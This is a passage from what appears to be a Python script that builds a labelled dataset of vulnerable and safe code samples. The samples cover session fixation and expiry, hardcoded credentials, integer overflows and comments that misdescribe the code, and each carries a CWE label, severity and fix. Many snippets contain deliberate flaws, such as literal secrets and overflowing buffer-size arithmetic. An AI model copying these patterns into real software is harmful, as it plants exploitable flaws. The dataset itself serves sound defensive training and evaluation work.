    return resp
""",
    "python", "vuln_session_logout_valid.py",
    True, "CWE-613 会话过期失效", "Medium",
    "登出后 session 仍有效", "set_cookie 仅删前端 cookie",
    "登出仅删前端 cookie，服务端 session store 未删除 → 旧 session id 仍可用",
    "登出时 session.clear() + 从服务端 session store 删除该 session id",
    cot_type="missing_control",
)

add(
    """
@app.route('/admin/promote', methods=['POST'])
@login_required
def promote_to_admin():
    user = current_user()
    user.is_admin = True
    user.save()
    # 提权后未重新生成 session / 未刷新 session 中的角色缓存
    session['roles'] = ['admin']  # 旧 session id 仍可被固定攻击利用
    return 'promoted'
""",
    "python", "vuln_session_no_rotate_privilege.py",
    True, "CWE-384 会话固定", "Medium",
    "提权后未轮换 session", "session['roles'] = ['admin']",
    "提权后未重新生成 session id → 旧 session 仍有效且权限提升，会话固定 + 权限缓存不一致",
    "提权后 session.clear() + regenerate，并刷新 session 中的角色信息",
    cot_type="missing_control",
)

add(
    """
@PostMapping("/logout")
public String logout(HttpServletRequest request) {
    // 仅调 SecurityContextHolder.clear()，未使 HttpSession 失效
    SecurityContextHolder.clearContext();
    return "redirect:/login";
}
""",
    "java", "vuln_session_spring_noinvalidate.java",
    True, "CWE-613 会话过期失效", "Medium",
    "登出未失效 session", "SecurityContextHolder.clearContext()",
    "登出仅清 SecurityContext 未调 session.invalidate() → 旧 session id 仍可访问",
    "登出时 request.getSession().invalidate() + SecurityContextHolder.clearContext()",
    cot_type="missing_control",
)

add(
    """
# Sinatra 登录后不重新生成 session
post '/login' do
  user = User.authenticate(params[:email], params[:password])
  if user
    session[:user_id] = user.id   # 复用旧 session id
    redirect '/dashboard'
  end
end
""",
    "ruby", "vuln_session_sinatra_fixation.rb",
    True, "CWE-384 会话固定", "Medium",
    "登录前 session id", "session[:user_id] = user.id",
    "Sinatra 登录后未重新生成 session id → 会话固定",
    "登录后 session.clear + 重新设置 user_id（rack-protection 提供 session 滚动）",
    cot_type="missing_control",
)

add(
    """
from django.contrib.auth import authenticate

def login_view(request):
    user = authenticate(request, username=request.POST['u'], password=request.POST['p'])
    if user is not None:
        request.session.cycle_key()      # 防会话固定
        request.session['uid'] = user.id
        request.session.set_expiry(3600)  # 闲置 1 小时
        return HttpResponse('ok')
""",
    "python", "safe_session_django_cycle.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

add(
    """
app.config['SESSION_COOKIE_MAXAGE'] = None  # 无绝对超时
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=3650)

@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form)
    if user:
        session['user_id'] = user.id
        session.permanent = True
        return 'OK'
""",
    "python", "vuln_session_no_absolute_timeout.py",
    True, "CWE-613 会话不过期", "Medium",
    "session 无绝对超时", "session.permanent = True",
    "PERMANENT_SESSION_LIFETIME 设为 10 年 + permanent=True → session 实际不过期",
    "设置合理 SESSION_COOKIE_AGE / PERMANENT_SESSION_LIFETIME（如 8h）+ 闲置超时",
    cot_type="missing_control",
)

add(
    """
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=30)
app.config['SESSION_REFRESH_EACH_REQUEST'] = False

@app.route('/dashboard')
def dashboard():
    # 不刷新过期时间，但也没有闲置检测 → 一旦登录 30 天内任意访问都有效
    return render_template('dashboard.html', user=current_user())
""",
    "python", "vuln_session_no_idle_timeout.py",
    True, "CWE-613 会话不过期", "Medium",
    "无闲置超时", "session 复用",
    "SESSION_REFRESH_EACH_REQUEST=False + 30 天 lifetime → 长期不活动 session 仍有效",
    "开启 SESSION_REFRESH_EACH_REQUEST=True 并设置较短闲置超时（如 30 分钟）",
    cot_type="missing_control",
)

add(
    """
@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form)
    if user:
        session['user_id'] = user.id
        session.permanent = True  # 永不过期（无 lifetime 配置）
        return 'OK'
""",
    "python", "vuln_session_permanent.py",
    True, "CWE-613 会话不过期", "Medium",
    "session.permanent = True 无 lifetime", "session 永久",
    "session.permanent=True 但未配 PERMANENT_SESSION_LIFETIME → 默认 31 天且无闲置超时",
    "设置 PERMANENT_SESSION_LIFETIME 为合理值，并对敏感操作要求重新认证",
    cot_type="missing_control",
)

add(
    """
const session = require('express-session');
app.use(session({
    secret: 'keyboard cat',
    resave: true,
    saveUninitialized: true,
    // 未设置 cookie.maxAge / cookie.expires → 服务端 session 永久驻留
    cookie: { httpOnly: true }
}));
""",
    "javascript", "vuln_session_express_nomaxage.js",
    True, "CWE-613 会话不过期", "Medium",
    "session store 无过期", "session() 中间件",
    "express-session 未设 maxAge 且 resave=true → 服务端 session 永久驻留内存/store",
    "设置 cookie.maxAge 与 store 的 TTL，resave=false，rolling=true",
    cot_type="missing_control",
)

add(
    """
<?php
// 未设置 session.gc_maxlifetime / cookie_lifetime，默认可能很大
session_start();
$_SESSION['uid'] = $user_id;
// 也不主动重新生成 session id
""",
    "php", "vuln_session_php_notimeout.php",
    True, "CWE-613 会话不过期", "Medium",
    "session 无过期配置", "session_start() + $_SESSION",
    "未配 session.gc_maxlifetime / cookie_lifetime 也未 regenerate → session 长期有效 + 会话固定风险",
    "ini_set('session.gc_maxlifetime', 1800); session_regenerate_id(true) 登录后",
    cot_type="missing_control",
)

add(
    """
app.config['SESSION_COOKIE_AGE'] = 28800  # 8 小时绝对超时
app.config['SESSION_REFRESH_EACH_REQUEST'] = True
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(seconds=1800)  # 闲置 30 分钟

@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form)
    if user:
        session.clear()
        session['user_id'] = user.id
        return 'OK'
""",
    "python", "safe_session_cookie_age.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

add(
    """
@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form)
    if user:
        session.clear()
        session['user_id'] = user.id
        session['abs_exp'] = time.time() + 8 * 3600   # 绝对 8h
        session['idle_exp'] = time.time() + 30 * 60   # 闲置 30min
        return 'OK'

@app.before_request
def check_session_timeout():
    now = time.time()
    if 'abs_exp' in session:
        if now > session['abs_exp'] or now > session['idle_exp']:
            session.clear()
            return redirect('/login')
        session['idle_exp'] = now + 30 * 60  # 续期闲置
""",
    "python", "safe_session_dual_timeout.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

add(
    """
const session = require('express-session');
app.use(session({
    secret: process.env.SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    rolling: true,
    cookie: { httpOnly: true, secure: true, maxAge: 30 * 60 * 1000 }  // 30 分钟闲置
}));
""",
    "javascript", "safe_session_express_maxage.js",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

# ===========================================================================
# 51. 硬编码凭证深化（CWE-798）—— 多语言/多隐藏形式
# ===========================================================================

add(
    """
public class S3Config {
    // 直接写在源码里
    private static final String ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE";
    private static final String SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY";

    public AmazonS3 s3Client() {
        BasicAWSCredentials creds = new BasicAWSCredentials(ACCESS_KEY, SECRET_KEY);
        return AmazonS3ClientBuilder.standard()
            .withCredentials(new AWSStaticCredentialsProvider(creds))
            .build();
    }
}
""",
    "java", "vuln_hardcoded_aws_java.java",
    True, "CWE-798 硬编码凭证", "High",
    "源码字面量 ACCESS_KEY/SECRET_KEY", "new BasicAWSCredentials(ACCESS_KEY, SECRET_KEY)",
    "类常量 ACCESS_KEY/SECRET_KEY 为字符串字面量 → AWSStaticCredentialsProvider → 凭证随源码进入版本库",
    "从环境变量或 AWS IAM Role / Secrets Manager 读取，禁止字面量",
    cot_type="hardcoded_secret",
)

add(
    """
<?php
class Database {
    private $host = 'db.prod.internal';
    private $user = 'appuser';
    private $pass = 'P@ssw0rd!2019';  // 硬编码 DB 密码
    public function connect() {
        return new PDO("mysql:host={$this->host}", $this->user, $this->pass);
    }
}
""",
    "php", "vuln_hardcoded_db_php.php",
    True, "CWE-798 硬编码凭证", "High",
    "类属性 $pass 字面量", "new PDO(..., $this->pass)",
    "$pass = 'P@ssw0rd!2019' 字面量 → PDO 连接 → 凭证泄露",
    "从 getenv('DB_PASSWORD') 读取",
    cot_type="hardcoded_secret",
)

add(
    """
// 前端配置中硬编码第三方 API key
const STRIPE_PUBLISHABLE = "pk_live_51HqkXfGmBVC...";
const GOOGLE_MAPS_KEY = "AIzaSyD-xxxxxxxxxxxxxxxxxxxxxxxx";

export function initMap() {
    const map = new google.maps.Map(document.getElementById('map'), {
        key: GOOGLE_MAPS_KEY,
        center: { lat: -34, lng: 150 }
    });
}
""",
    "javascript", "vuln_hardcoded_apikey_js.js",
    True, "CWE-798 硬编码凭证", "High",
    "源码字面量 GOOGLE_MAPS_KEY", "new google.maps.Map({ key })",
    "GOOGLE_MAPS_KEY 为字面量 → 前端 bundle 内暴露 → 被盗用产生费用",
    "通过后端代理转发 API 调用，key 仅存后端环境变量",
    cot_type="hardcoded_secret",
)

add(
    """
package auth

var jwtSecret = []byte("super-secret-key-123")  // 硬编码 JWT 签名密钥

func SignToken(claims map[string]interface{}) (string, error) {
    token := jwt.NewWithClaims(jwt.SigningMethodHS256, jwt.MapClaims(claims))
    return token.SignedString(jwtSecret)
}
""",
    "go", "vuln_hardcoded_jwt_go.go",
    True, "CWE-798 硬编码凭证", "High",
    "源码字面量 jwtSecret", "token.SignedString(jwtSecret)",
    "jwtSecret = []byte('...') 字面量 → HS256 签名 → 任何能看到源码的人都能伪造 token",
    "从 os.Getenv('JWT_SECRET') 读取，且密钥长度 >= 32 字节",
    cot_type="hardcoded_secret",
)

add(
    """
SMTP_HOST = 'smtp.gmail.com'
SMTP_USER = 'notify@example.com'
SMTP_PASSWORD = 'nfqv umcf qwer asdf'  # Gmail 应用专用密码

def send_mail(to, subject, body):
    server = smtplib.SMTP_SSL(SMTP_HOST, 465)
    server.login(SMTP_USER, SMTP_PASSWORD)
    server.sendmail(SMTP_USER, to, f'Subject: {subject}\\n\\n{body}')
""",
    "python", "vuln_hardcoded_smtp.py",
    True, "CWE-798 硬编码凭证", "High",
    "源码字面量 SMTP_PASSWORD", "server.login(SMTP_USER, SMTP_PASSWORD)",
    "SMTP_PASSWORD 字面量 → server.login → 凭证随源码泄露",
    "从环境变量 / Secrets Manager 读取 SMTP_PASSWORD",
    cot_type="hardcoded_secret",
)

add(
    """
GITHUB_CLIENT_ID = "Iv1.abc123def456"
GITHUB_CLIENT_SECRET = "ghs_abcdef0123456789abcdef0123456789"  # OAuth client secret 硬编码

@app.route('/oauth/callback')
def oauth_callback():
    code = request.args.get('code')
    resp = requests.post('https://github.com/login/oauth/access_token',
                         data={'client_id': GITHUB_CLIENT_ID,
                               'client_secret': GITHUB_CLIENT_SECRET,
                               'code': code})
    return resp.text
""",
    "python", "vuln_hardcoded_oauth.py",
    True, "CWE-798 硬编码凭证", "High",
    "源码字面量 GITHUB_CLIENT_SECRET", "requests.post(..., client_secret=...)",
    "GITHUB_CLIENT_SECRET 字面量 → requests.post → 凭证可冒充应用",
    "从环境变量读取 client secret",
    cot_type="hardcoded_secret",
)

add(
    """
SSH_HOST = '10.0.0.5'
SSH_USER = 'deploy'
SSH_PASSPHRASE = 'deploy123'  # SSH 私钥 passphrase 硬编码

def deploy():
    pkey = paramiko.RSAKey.from_private_key_file('/etc/deploy/id_rsa',
                                                 password=SSH_PASSPHRASE)
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(SSH_HOST, username=SSH_USER, pkey=pkey)
""",
    "python", "vuln_hardcoded_ssh.py",
    True, "CWE-798 硬编码凭证", "High",
    "源码字面量 SSH_PASSPHRASE", "RSAKey.from_private_key_file(password=...)",
    "SSH_PASSPHRASE 字面量 → 私钥 passphrase 泄露 → 攻击者拿到私钥即可用",
    "用 ssh-agent + 环境变量管理 passphrase",
    cot_type="hardcoded_secret",
)

add(
    """
# AES 加密密钥硬编码
ENCRYPTION_KEY = b'ThisIsA16ByteKey'  # 16 字节 AES-128 密钥

def encrypt_field(plaintext: str) -> bytes:
    iv = os.urandom(16)
    cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, iv)
    ct = cipher.encrypt(pad(plaintext.encode(), 16))
    return iv + ct
""",
    "python", "vuln_hardcoded_enckey.py",
    True, "CWE-798 硬编码凭证", "High",
    "源码字面量 ENCRYPTION_KEY", "AES.new(ENCRYPTION_KEY, ...)",
    "ENCRYPTION_KEY = b'ThisIsA16ByteKey' 字面量 → AES.new → 任何看到源码的人都能解密所有密文",
    "用 KMS / Vault 托管主密钥，数据密钥通过 envelope encryption",
    cot_type="hardcoded_secret",
)

add(
    """
# 密码加盐但 salt 硬编码
STATIC_SALT = 'myapp_static_salt_v1'

def hash_password(password: str) -> str:
    return hashlib.sha256((STATIC_SALT + password).encode()).hexdigest()
""",
    "python", "vuln_hardcoded_salt.py",
    True, "CWE-798 硬编码凭证", "Medium",
    "源码字面量 STATIC_SALT", "sha256(STATIC_SALT + password)",
    "STATIC_SALT 字面量 → 所有用户共用且随源码泄露 → 彩虹表预计算可批量破解",
    "使用 bcrypt/argon2 自带 per-user salt，不要自己加盐",
    cot_type="hardcoded_secret",
)

add(
    """
SLACK_BOT_TOKEN = "xoxb-1234567890-abcdef"  # Slack SDK token 硬编码

def notify_slack(channel, text):
    client = slack.WebClient(token=SLACK_BOT_TOKEN)
    client.chat_postMessage(channel=channel, text=text)
""",
    "python", "vuln_hardcoded_sdk_token.py",
    True, "CWE-798 硬编码凭证", "High",
    "源码字面量 SLACK_BOT_TOKEN", "slack.WebClient(token=SLACK_BOT_TOKEN)",
    "SLACK_BOT_TOKEN 字面量 → WebClient → 凭证泄露可冒充 bot 发消息/读频道",
    "从环境变量 / Secret Manager 读取 token",
    cot_type="hardcoded_secret",
)

add(
    """
def _build_password():
    # 字符串拼接构造密码，仍为字面量
    return ''.join(['a', 'd', 'm', 'i', 'n']) + str(2024) + '!'

DB_PASSWORD = _build_password()
conn = psycopg2.connect(host='db', password=DB_PASSWORD)
""",
    "python", "vuln_hardcoded_concat.py",
    True, "CWE-798 硬编码凭证", "High",
    "拼接构造的字面量密码", "psycopg2.connect(password=DB_PASSWORD)",
    "_build_password() 由字面量拼接 → 等价于硬编码 'admin2024!' → 仍是字面量凭证",
    "从环境变量读取密码；拼接构造不构成动态获取",
    cot_type="hardcoded_secret",
)

add(
    """
# Base64 编码的密码（仍可解码）
import base64
ENCODED = b'cGFzc3dvcmQxMjM='  # base64('password123')
DB_PASSWORD = base64.b64decode(ENCODED).decode()

conn = psycopg2.connect(host='db', password=DB_PASSWORD)
""",
    "python", "vuln_hardcoded_b64.py",
    True, "CWE-798 硬编码凭证", "High",
    "Base64 字面量 ENCODED", "psycopg2.connect(password=DB_PASSWORD)",
    "ENCODED 为 base64 字面量 → b64decode 即得明文 → 编码不等于加密，仍是硬编码",
    "从环境变量 / Secrets Manager 读取；Base64 不是凭证保护手段",
    cot_type="hardcoded_secret",
)

add(
    """
# 测试服务器：root / rootpass123  （注释中的真实凭证）
# 生产数据库：postgres / Pr0dPa$$!234
def get_db():
    return psycopg2.connect(host='db.prod', user='postgres',
                            password=os.environ.get('DB_PASSWORD', 'Pr0dPa$$!234'))
""",
    "python", "vuln_hardcoded_comment.py",
    True, "CWE-798 硬编码凭证", "High",
    "注释 + 默认值字面量", "psycopg2.connect(password=...)",
    "注释含真实凭证 + os.environ.get 默认值也是硬编码密码 → 双重硬编码",
    "删除注释中的凭证；默认值改为 None 并在缺失时 fail-fast",
    cot_type="hardcoded_secret",
)

add(
    """
# tests/test_smtp.py — 测试代码中用了真实 SMTP 凭证
class TestSMTP(unittest.TestCase):
    SMTP_USER = 'notify@realcompany.com'
    SMTP_PASSWORD = 'realpass_smtp_2024'  # 真实生产凭证

    def test_send(self):
        server = smtplib.SMTP('smtp.realcompany.com', 587)
        server.login(self.SMTP_USER, self.SMTP_PASSWORD)
""",
    "python", "vuln_hardcoded_test.py",
    True, "CWE-798 硬编码凭证", "High",
    "测试代码字面量 SMTP_PASSWORD", "server.login(SMTP_USER, SMTP_PASSWORD)",
    "测试代码中 SMTP_PASSWORD 为真实生产凭证字面量 → 测试代码也进版本库 → 凭证泄露",
    "测试用 mock / 测试专用凭证；生产凭证绝不入测试代码",
    cot_type="hardcoded_secret",
)

add(
    """
#include <string.h>
#include <mysql/mysql.h>

int connect_db() {
    const char *pass = "hardcoded_db_pass_2024";  // C 代码硬编码 DB 密码
    MYSQL *conn = mysql_init(NULL);
    if (!mysql_real_connect(conn, "db.local", "app", pass, "appdb", 0, NULL, 0)) {
        return -1;
    }
    return 0;
}
""",
    "c", "vuln_hardcoded_c_pass.c",
    True, "CWE-798 硬编码凭证", "High",
    "源码字面量 pass", "mysql_real_connect(..., pass, ...)",
    "const char *pass = \"hardcoded_db_pass_2024\" 字面量 → mysql_real_connect → 凭证泄露",
    "从环境变量 getenv('DB_PASSWORD') 读取",
    cot_type="hardcoded_secret",
)

add(
    """
# Ruby：SMTP 凭证硬编码
SMTP_CONFIG = {
  address: 'smtp.example.com',
  port: 587,
  user_name: 'notify@example.com',
  password: 'ruby_smtp_pass_2024'
}

Mail.defaults { delivery_method :smtp, SMTP_CONFIG }
""",
    "ruby", "vuln_hardcoded_smtp.rb",
    True, "CWE-798 硬编码凭证", "High",
    "源码字面量 password", "delivery_method :smtp, SMTP_CONFIG",
    "SMTP_CONFIG[:password] 字面量 → delivery_method → 凭证随源码泄露",
    "从 ENV['SMTP_PASSWORD'] 读取",
    cot_type="hardcoded_secret",
)

add(
    """
import os
from dotenv import load_dotenv
load_dotenv()

DB_PASSWORD = os.environ['DB_PASSWORD']  # 缺失即 KeyError，fail-fast
AWS_SECRET_KEY = os.environ['AWS_SECRET_ACCESS_KEY']

conn = psycopg2.connect(host='db', password=DB_PASSWORD)
""",
    "python", "safe_secret_dotenv.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

add(
    """
import boto3, json

def get_db_password():
    client = boto3.client('secretsmanager')
    resp = client.get_secret_value(SecretId='prod/db/app')
    return json.loads(resp['SecretString'])['password']

conn = psycopg2.connect(host='db', password=get_db_password())
""",
    "python", "safe_secret_aws_sm.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

add(
    """
@Component
public class DbConfig {
    @Value("${db.password}")
    private String dbPassword;

    public DataSource dataSource() {
        HikariDataSource ds = new HikariDataSource();
        ds.setPassword(dbPassword);  // 从 Spring 环境 / K8s Secret 注入
        return ds;
    }
}
""",
    "java", "safe_secret_spring_value.java",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

add(
    """
import os
# K8s Secret 通过环境变量注入（deployment.yaml: envFrom: secretRef）
API_KEY = os.environ['API_KEY']        # 由 K8s Secret 注入
DB_PASSWORD = os.environ['DB_PASSWORD']

client = stripe.StripeClient(API_KEY)
""",
    "python", "safe_secret_k8s.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

# ===========================================================================
# 52. 整数溢出深化（CWE-190）—— 多语言/多运算/多后果
# ===========================================================================

add(
    """
#include <stdint.h>
#include <stdlib.h>

int64_t compute_total(int32_t price, int32_t qty) {
    /* price * qty 在 int32 域内先溢出，再扩展到 int64_t 已为时已晚 */
    int64_t total = (int64_t)(price * qty);
    return total;
}
""",
    "c", "vuln_intovf_c_mul.c",
    True, "CWE-190 整数溢出", "High",
    "price/qty int32 参数", "price * qty",
    "price*qty 在 int32 域内先溢出再扩展为 int64_t → 溢出已发生，扩展无法挽回",
    "先扩展再相乘：(int64_t)price * qty，或用 __builtin_mul_overflow 检测",
    cot_type="integer_overflow",
)

add(
    """
#include <vector>
#include <cstdint>

void fill_buffer(std::vector<char>& buf, uint32_t count, uint32_t elem_size) {
    // count * elem_size 可能溢出 uint32，分配过小缓冲区
    uint32_t total = count * elem_size;
    buf.resize(total);
    for (uint32_t i = 0; i < count; ++i) {
        buf.insert(buf.end(), elem_size, 0);
    }
}
""",
    "cpp", "vuln_intovf_cpp_index.cpp",
    True, "CWE-190 整数溢出", "High",
    "count/elem_size uint32 参数", "count * elem_size",
    "count*elem_size 溢出 uint32 → buf.resize 分配过小 → 后续写入越界（堆溢出）",
    "用 size_t 并做溢出检查：if (elem_size && count > SIZE_MAX/elem_size) throw;",
    cot_type="integer_overflow",
)

add(
    """
public class Donation {
    // int 累加捐款，可能溢出为负
    public int totalDonations(int[] amounts) {
        int total = 0;
        for (int amt : amounts) {
            total += amt;  // 无溢出检查
        }
        return total;
    }
}
""",
    "java", "vuln_intovf_java_add.java",
    True, "CWE-190 整数溢出", "High",
    "amounts 累加", "total += amt",
    "int 累加溢出为负 → 后续 if (total > 0) 校验被绕过 / 金额错误",
    "用 Math.addExact / long / BigInteger，或手动溢出检查",
    cot_type="integer_overflow",
)

add(
    """
public byte[] buildPacket(int headerLen, int bodyLen) {
    // 数组长度计算溢出 → 负数 → NegativeArraySizeException 或分配异常
    int total = headerLen + bodyLen + 8;
    byte[] packet = new byte[total];
    System.arraycopy(header, 0, packet, 0, headerLen);
    System.arraycopy(body, 0, packet, headerLen, bodyLen);
    return packet;
}
""",
    "java", "vuln_intovf_java_arrlen.java",
    True, "CWE-190 整数溢出", "High",
    "headerLen + bodyLen + 8", "new byte[total]",
    "total 计算溢出 → new byte[total] 抛 NegativeArraySizeException 或分配过小数组 → 越界",
    "用 Math.addExact 链式检查，或显式 if (bodyLen > Integer.MAX_VALUE - headerLen - 8) throw",
    cot_type="integer_overflow",
)

add(
    """
package pricing

func ComputeOrderTotal(price, qty int32) int32 {
    // int32 乘法溢出无检查
    total := price * qty
    if total < 0 {
        return 0  // 溢出后误判为"异常"但只是吞掉
    }
    return total
}
""",
    "go", "vuln_intovf_go_mul.go",
    True, "CWE-190 整数溢出", "High",
    "price/qty int32", "price * qty",
    "int32 乘法溢出回绕为负 → if total < 0 静默返回 0，金额被吞 / 后续逻辑错乱",
    "用 math/bits.Mul32 检测溢出，或 int64 计算 + 范围断言",
    cot_type="integer_overflow",
)

add(
    """
// release 模式下整数溢出回绕（debug 才 panic）
fn calc_bonus(base: u32, multiplier: u32) -> u32 {
    base * multiplier  // release 回绕，bonus 可能变小
}

fn main() {
    let bonus = calc_bonus(500_000, 8000);  // 期望 4_000_000_000，回绕后变小
    println!("bonus = {}", bonus);
}
""",
    "rust", "vuln_intovf_rust_wrap.rs",
    True, "CWE-190 整数溢出", "Medium",
    "base/multiplier u32", "base * multiplier",
    "release 模式 u32 乘法回绕 → bonus 异常变小，金额计算错误",
    "用 checked_mul / saturating_mul / wrapping 显式表达意图，避免静默回绕",
    cot_type="integer_overflow",
)

add(
    """
import numpy as np

def sum_pixels(image_uint8):
    # numpy uint8 累加溢出（不像 Python int 无限精度）
    arr = np.array(image_uint8, dtype=np.uint8)
    total = arr.sum(dtype=np.uint8)  # 255*100 在 uint8 内回绕
    return total
""",
    "python", "vuln_intovf_numpy.py",
    True, "CWE-190 整数溢出", "Medium",
    "image_uint8 元素", "arr.sum(dtype=np.uint8)",
    "numpy uint8 sum 在 uint8 域内回绕 → 像素总和错误（Python 原生 int 不溢出，但 numpy 指定 dtype 会）",
    "用 dtype=np.int64 或先转 int64 再求和",
    cot_type="integer_overflow",
)

add(
    """
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

char* read_records(uint32_t count, uint32_t rec_size) {
    // 缓冲区大小计算溢出 → 分配过小 → 拷贝越界
    uint32_t buf_size = count * rec_size;
    char *buf = (char*)malloc(buf_size);
    for (uint32_t i = 0; i < count; i++) {
        memcpy(buf + i*rec_size, get_record(i), rec_size);
    }
    return buf;
}
""",
    "c", "vuln_intovf_buffer.c",
    True, "CWE-190 整数溢出", "High",
    "count * rec_size", "malloc(buf_size) + memcpy",
    "count*rec_size 溢出 uint32 → malloc 分配过小 → memcpy 越界写 → 堆溢出",
    "用 size_t + 溢出检查：if (rec_size && count > SIZE_MAX/rec_size) return NULL;",
    cot_type="integer_overflow",
)

add(
    """
public class Wallet {
    // 金额以"分"为单位存 int，乘法溢出
    public int applyFee(int amountCents, int feeBps) {
        // feeBps 为基点（万分之），amountCents * feeBps 可能溢出
        int fee = (amountCents * feeBps) / 10000;
        return amountCents - fee;
    }
}
""",
    "java", "vuln_intovf_amount.java",
    True, "CWE-190 整数溢出", "High",
    "amountCents * feeBps", "(amountCents * feeBps) / 10000",
    "amountCents*feeBps 在 int 内溢出 → fee 计算错误 → 金额绕过/少扣手续费",
    "用 long 计算：long fee = ((long)amountCents * feeBps) / 10000; 并做范围断言",
    cot_type="integer_overflow",
)

add(
    """
import time

def calc_expiry(seconds_to_add):
    # 时间戳 + 大整数偏移，存入 32 位字段时溢出
    expiry = int(time.time()) + seconds_to_add
    return expiry  # 存入 32 位字段时溢出为负
""",
    "python", "vuln_intovf_timestamp.py",
    True, "CWE-190 整数溢出", "Medium",
    "time.time() + seconds_to_add", "expiry 存入 32 位字段",
    "expiry 存入 32 位 int 字段时溢出为负 → token 永不过期 / 校验逻辑错乱",
    "用 64 位时间戳字段 + 范围断言；避免 32 位存时间",
    cot_type="integer_overflow",
)

add(
    """
#include <stdint.h>

int parse_packet(const uint8_t *data, uint32_t len) {
    // len 字段来自网络，header_len + body_len 可能溢出
    uint32_t header_len = 4;
    uint32_t body_len = len;
    uint32_t total = header_len + body_len;  // len=0xFFFFFFFC 时溢出为 0
    if (total > sizeof(buffer)) return -1;
    memcpy(buffer, data, total);  // total=0 绕过校验但 body_len 仍大
    return 0;
}
""",
    "c", "vuln_intovf_length.c",
    True, "CWE-190 整数溢出", "High",
    "header_len + body_len", "memcpy(buffer, data, total)",
    "total = 4 + 0xFFFFFFFC 溢出为 0 → 绕过 sizeof 校验 → 但后续按 body_len 处理 → 越界",
    "用 64 位累加 + 边界检查：if (body_len > MAX - header_len) return -1;",
    cot_type="integer_overflow",
)

add(
    """
#include <stdint.h>
#include <stdlib.h>

int64_t compute_total_safe(int32_t price, int32_t qty) {
    int64_t result;
    if (__builtin_mul_overflow(price, qty, &result)) {
        return -1;  // 溢出，返回错误
    }
    return result;
}
""",
    "c", "safe_intovf_builtin.c",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

add(
    """
public class SafeMath {
    public static int addExact(int a, int b) {
        int r = a + b;
        if (((a ^ r) & (b ^ r)) < 0) {
            throw new ArithmeticException("integer overflow");
        }
        return r;
    }

    public int totalDonations(int[] amounts) {
        int total = 0;
        for (int amt : amounts) {
            total = addExact(total, amt);  // 溢出抛异常
        }
        return total;
    }
}
""",
    "java", "safe_intovf_safemath.java",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

add(
    """
def compute_total(price: int, qty: int) -> int:
    # Python int 不溢出，但仍校验业务范围，避免后续转 int32 时溢出
    if price < 0 or qty < 0:
        raise ValueError('negative input')
    total = price * qty
    if total > 2**31 - 1:
        raise OverflowError('exceeds int32 range')
    return total
""",
    "python", "safe_intovf_assert.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

add(
    """
def sum_amounts(amounts):
    # Python 原生 int 任意精度，累加不会溢出
    total = 0
    for amt in amounts:
        if amt < 0:
            raise ValueError('negative amount')
        total += amt
    return total

def aggregate_wallets(wallets):
    return sum_amounts([w['balance'] for w in wallets])
""",
    "python", "safe_intovf_bigint.py",
    False, "none", "None", "N/A", "N/A", "N/A", "no fix needed",
)

# ===========================================================================
# 53. 噪声/混淆样本深化 —— 误导注释/装饰器/try-catch/看似危险实为安全
#    所有样本均手写 analysis，明确解释为何注释/包装不能改变安全语义
# ===========================================================================

add(
    """
# 使用 bcrypt 安全哈希用户密码
def hash_password(password):
    # 此处用 bcrypt 实现
    return hashlib.md5(password.encode()).hexdigest()
""",
    "python", "noise_comment_bcrypt_lie.py",
    True, "CWE-327 弱哈希", "High",
    "password 参数", "hashlib.md5(password).hexdigest()",
    "注释声称 bcrypt，实际 md5 → 弱哈希；注释不改变实际算法",
    "使用 bcrypt：bcrypt.hashpw(password.encode(), bcrypt.gensalt())",
    analysis=(
        "分析过程：\n"
        "1. 污染源：password 参数（用户密码）。\n"
        "2. 危险 sink：hashlib.md5(password.encode()).hexdigest()。\n"
        "3. 数据流：password 直接进入 md5 哈希。\n"
        "4. 防御检查：注释 # 使用 bcrypt 安全哈希 / 此处用 bcrypt 实现，但代码实际调用 hashlib.md5。"
        "判定基于实际代码：md5 是已破解的弱哈希算法，存在大量彩虹表，不适合密码存储。"
        "注释不能改变代码语义，代码执行的是 md5 而非 bcrypt。\n"
        "5. 结论：弱哈希（md5）漏洞，注释误导不构成防御，风险 High。"
    ),
    cot_type="crypto_weakness",
)

add(
    """
@app.route('/transfer', methods=['POST'])
# CSRF 防护已启用
def transfer():
    # 已校验 csrf_token
    to = request.form['to']
    amount = request.form['amount']
    db.transfer(current_user, to, amount)
    return 'OK'
""",
    "python", "noise_comment_csrf_lie.py",
    True, "CWE-352 CSRF", "Medium",
    "POST 表单实际无 CSRF token 校验", "db.transfer",
    "注释声称已校验 csrf_token，但函数体无任何 token 校验代码 → CSRF；注释不构成控制",
    "加入 validate_csrf_token(request.form.get('csrf_token')) 并 abort(403)",
    analysis=(
        "分析过程：\n"
        "1. 控制点检查：转账操作应校验 CSRF token。\n"
        "2. 控制是否缺失：函数体 transfer() 中只有 to = request.form['to']、amount = request.form['amount']、"
        "db.transfer(...) 三行实际代码，注释 # CSRF 防护已启用 / # 已校验 csrf_token 没有对应任何真实校验调用。\n"
        "3. 攻击面：POST /transfer 无 token 校验，攻击者可构造跨站表单触发转账。\n"
        "4. 防御检查：注释不能代替控制点存在性。代码中找不到 validate_csrf_token / CSRFProtect 等任何实际校验调用。\n"
